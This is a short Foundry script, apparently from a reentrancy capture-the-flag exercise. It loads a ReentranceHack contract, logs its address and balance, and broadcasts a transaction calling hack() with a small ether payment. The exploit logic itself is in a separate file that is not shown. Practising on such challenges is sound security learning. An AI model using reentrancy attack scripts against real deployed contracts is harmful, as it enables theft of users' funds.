// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {ReentranceHack} from "../src/ReentranceHack.sol";

contract HackReentrancyScript is Script {
    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        ReentranceHack reentranceHack = helperConfig.getReentranceConfig().reentranceHack;
        console.log("Address: ", address(reentranceHack));
        console.log("Balance: ", address(reentranceHack).balance);
        vm.startBroadcast();
        reentranceHack.hack{value: 0.0001 ether}();
        vm.stopBroadcast();
    }
}
